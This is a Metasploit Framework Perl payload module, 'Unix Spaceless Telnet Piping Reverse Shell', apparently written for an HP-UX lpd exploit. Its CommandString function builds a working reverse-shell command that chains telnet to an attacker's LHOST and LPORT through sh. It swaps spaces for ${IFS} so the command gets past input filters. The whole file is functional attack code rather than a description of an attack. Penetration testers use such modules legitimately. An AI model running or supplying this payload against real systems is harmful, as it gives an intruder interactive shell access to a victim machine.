
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::cmd_unix_reverse_nss;
use strict;
use base 'Msf::PayloadComponent::CommandPayload';
sub _Load {
  Msf::PayloadComponent::CommandPayload->_Import('Msf::PayloadComponent::DoubleReverseConnection');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'Unix Spaceless Telnet Piping Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Use telnet|sh|telnet to simulate reverse shell with no spaces or slashes',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Priv'         => 0,
  'OS'           => [ 'solaris', 'linux', 'bsd', 'hpux' ],
  'Keys'         => ['+cmd_nospaceslash'],
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  $self->_Info->{'Keys'} = $info->{'Keys'};
  return($self);
}

# This payload was developed explicitly for the HP-UX lpd exploit...
sub CommandString {
  my $self = shift;
  my $host = $self->GetVar('LHOST');
  my $port = $self->GetVar('LPORT');

  my $command =
  "sleep 1|".
  "telnet $host $port|".
  "sh|".
  "telnet $host $port";
  
  $command =~ s/\s+/\$\{IFS\}/g;
  return($command);
}

1;
